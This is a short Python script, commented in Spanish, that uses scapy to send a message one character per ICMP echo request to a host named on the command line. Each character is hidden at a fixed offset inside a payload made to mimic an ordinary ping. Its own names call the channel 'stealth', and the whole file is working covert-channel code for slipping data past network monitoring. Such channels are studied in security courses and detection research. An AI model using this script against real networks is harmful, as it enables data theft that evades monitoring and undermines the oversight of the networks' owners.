#!/usr/bin/env python3
import sys
import time
import struct
from scapy.all import IP, ICMP, sr1, conf

conf.verb = 0

PAYLOAD_SIZE = 56
TIMESTAMP_SIZE = 8
PATTERN_START = 0x10
POSICION_INYECCION = 8
ID_ICMP = 0x1234

def generar_payload(caracter):
    t = time.time()
    segundos = int(t)
    microsegundos = int((t % 1) * 1_000_000)
    timestamp = struct.pack('<II', segundos, microsegundos)
    caracter_byte = caracter.encode('utf-8')[:1]
    if len(caracter_byte) == 0:
        caracter_byte = b'x'
    payload = bytearray(timestamp)
    for i in range(PAYLOAD_SIZE - TIMESTAMP_SIZE):
        payload.append((PATTERN_START + i) % 256)
    payload[POSICION_INYECCION] = caracter_byte[0]
    return bytes(payload)

def mostrar_hexdump(datos, titulo):
    print(f"\n--- {titulo} ---")
    for i in range(0, len(datos), 16):
        chunk = datos[i:i+16]
        hexa = ' '.join(f'{b:02x}' for b in chunk)
        ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f"{i:04x}: {hexa:<48} {ascii_repr}")
    print()

def enviar_icmp_stealth(destino, mensaje_cifrado):
    seq = 1
    print(f"Enviando mensaje cifrado a {destino}")
    print(f"Payload de {PAYLOAD_SIZE} bytes (timestamp LE + patrón incremental)")
    print(f"Carácter inyectado en la posición {POSICION_INYECCION}\n")
    for i, caracter in enumerate(mensaje_cifrado):
        payload = generar_payload(caracter)
        ip = IP(dst=destino, ttl=64)
        icmp = ICMP(type=8, code=0, id=ID_ICMP, seq=seq + i)
        paquete = ip / icmp / payload
        mostrar_hexdump(payload, f"Paquete {i+1} - carácter '{caracter}'")
        respuesta = sr1(paquete, timeout=1, verbose=False)
        if respuesta:
            print(f"Paquete {i+1}: enviado '{caracter}' -> respuesta recibida")
        else:
            print(f"Paquete {i+1}: enviado '{caracter}' -> sin respuesta")
        time.sleep(1)
    print("\nTodos los paquetes enviados.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: sudo python3 stealth_icmp_final.py <IP_destino> <mensaje_cifrado>")
        sys.exit(1)
    destino = sys.argv[1]
    mensaje = sys.argv[2]
    enviar_icmp_stealth(destino, mensaje)
